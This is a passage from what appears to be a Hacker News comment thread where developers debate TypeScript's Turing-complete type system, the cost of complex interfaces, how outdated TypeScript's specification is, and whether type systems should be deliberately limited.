choose \"that which sounds good\"... It&#x27;s like communism. It sounds good in theory but it fails spectacularly at the incentive layer... It fails at the most important layer. reply wk_end 5 hours agorootparentIt&#x27;s the exact opposite; TypeScript discourages complex interfaces by making them explicit. It&#x27;s far too easy in a dynamic language for devs to introduce absurdly complex interfaces without understanding the cognitive load it&#x27;s imposing on other users. In TypeScript, they&#x27;re forced to type it...which immediately reveals that complexity - if they&#x27;re able to do it all!This isn&#x27;t theoretical; the only reason TypeScript allows for such complex interfaces is precisely because JavaScript devs have created those interfaces, and TypeScript makes a best-effort to make as much JS code type-able as possible. reply motoxpro 8 hours agorootparentprevJust write your JS first and then type it afterward. Best of both. reply Kinrany 17 hours agoparentprevAny sufficiently advanced type system necessarily becomes Turing complete because type systems generalize to full compile time programming reply nicoburns 16 hours agoparentprevIf you think about it, then it makes quite a lot of sense that a type system aiming to describe the behaviour of a dynamically typed language would end up being this powerful. reply taneq 15 hours agorootparentHaving recently finished I Am A Strange Loop, I&#x27;m starting to think it&#x27;s harder for any formal system to not be Turing-complete than it is for it to be so. reply jonahx 17 hours agoparentprevI believe in both cases the Turing completeness is accidental, and in the case of CSS a security concern.(In the case of TS, see https:&#x2F;&#x2F;github.com&#x2F;microsoft&#x2F;TypeScript&#x2F;issues&#x2F;14833)If anyone has more historical evidence that this is so for CSS, reactions from original authors, etc, or further evidence in the case of TS, I&#x27;d be curious to see it. reply Dylan16807 15 hours agorootparentSecurity concern how?Also CSS can&#x27;t iterate so it&#x27;s just at the level of arithmetic. reply jlfsdlkj 17 hours agoparentprevIf you ever wrote any JS pre-typescript and then switched to typescript, I do not think you would call the problem \"very limited niche.\" reply _gabe_ 13 hours agoparentprevIsn’t every programming language simply a spec? C and C++ are infamous for just being a spec, with lots of undefined portions resulting in undefined behavior. And if every programming language is a spec, should we inhibit the flexibility of what you can do in them? (I think the answer here is no, but maybe there’s a good reason for limiting what you can do)Edit: Additionally, it takes very little to define a specification that leads to emergent behavior. That’s not necessarily a bad thing. It’s been awhile, but all you need for a turing machine is a way to store and read memory, and move the tape (instruction pointer) if I remember right. If that’s correct, you can come up with an infinitely complex machine with 3 instructions (provided you have an infinite amount of tape). reply n2d4 13 hours agorootparentTypeScript&#x27;s specification is very out-of-date. The best \"specification\" for the language is \"whatever the compiler does.\"(It&#x27;s a double-edged sword because it lets the TypeScript compiler move much faster than any other I&#x27;ve seen, but the lack of standardization regularly causes unintended breaking changes, and developing a competing-but-compatible type checker is basically impossible.) reply a_wild_dandan 16 hours agoparentprevWhy? What benefits would we maybe gain by weakening TypeScript? reply IshKebab 17 hours agoparentprevThere isn&#x27;t really any advantage of artificially limiting the power of type systems. Yes you shouldn&#x27;t implement Flappy Bird in a type system... but just don&#x27;t do that.

The game is not implemented in TypeScript types, right? It uses them to represent the code and has a custom interpreter for it.They could have done exactly the same in JSON instead.
